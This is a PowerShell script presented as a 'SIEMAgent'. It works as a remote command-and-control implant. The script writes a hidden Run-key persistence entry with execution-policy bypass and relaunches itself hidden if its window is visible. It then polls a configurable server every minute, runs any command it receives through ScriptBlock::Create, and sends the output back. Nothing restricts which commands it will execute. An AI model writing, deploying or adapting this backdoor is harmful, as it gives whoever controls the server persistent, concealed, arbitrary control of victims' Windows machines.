param(
    [string]$ApiUrl = "__API_URL__"
)

$hostname = $env:COMPUTERNAME

# ---------------------------------------------------------
# Detect if running as SYSTEM
# ---------------------------------------------------------
$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM")

# ---------------------------------------------------------
# HKCU Persistence (User Mode Only)
# ---------------------------------------------------------
if (-not $isSystem) {
    $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $scriptPath = $PSCommandPath

    if (-not (Get-ItemProperty -Path $runKey -Name "SIEMAgent" -ErrorAction SilentlyContinue)) {
        Set-ItemProperty -Path $runKey -Name "SIEMAgent" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    }

    # Relaunch hidden if visible
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win {
    [DllImport("user32.dll")]
    public static extern bool IsWindowVisible(IntPtr hWnd);
}
"@

    $h = (Get-Process -Id $PID).MainWindowHandle

    if ($h -ne 0 -and [Win]::IsWindowVisible($h)) {
        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
        exit
    }
}

# ---------------------------------------------------------
# Heartbeat
# ---------------------------------------------------------
function Send-Heartbeat {
    $payload = @{
        type      = "agent"
        hostname  = $hostname
        timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        message   = "alive"
    }

    try {
        Invoke-RestMethod -Uri "$ApiUrl/report" -Method POST -Body ($payload | ConvertTo-Json) -ContentType "application/json"
    }
    catch {}
}

# ---------------------------------------------------------
# Poll for next command
# ---------------------------------------------------------
function Get-NextCommand {
    try {
        return Invoke-RestMethod -Uri "$ApiUrl/next-command?host=$hostname" -Method GET -TimeoutSec 10
    }
    catch {
        return $null
    }
}

# ---------------------------------------------------------
# Execute command
# ---------------------------------------------------------
function Execute-Command($cmd) {
    try {
        $scriptBlock = [ScriptBlock]::Create($cmd)
        return & $scriptBlock 2>&1 | Out-String
    }
    catch {
        return "Execution error: $($_.Exception.Message)"
    }
}

# ---------------------------------------------------------
# Send command result
# ---------------------------------------------------------
function Send-Result($cmdId, $result) {
    $payload = @{
        type       = "commands"
        command_id = $cmdId
        hostname   = $hostname
        timestamp  = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        output     = $result
    }

    try {
        Invoke-RestMethod -Uri "$ApiUrl/report" -Method POST -Body ($payload | ConvertTo-Json -Depth 5) -ContentType "application/json"
    }
    catch {}
}

# ---------------------------------------------------------
# Main Loop
# ---------------------------------------------------------
while ($true) {

    Send-Heartbeat

    $cmd = Get-NextCommand

    if ($cmd -and $cmd.command) {
        $result = Execute-Command $cmd.command
        Send-Result $cmd.id $result
    }

    Start-Sleep -Seconds 60
}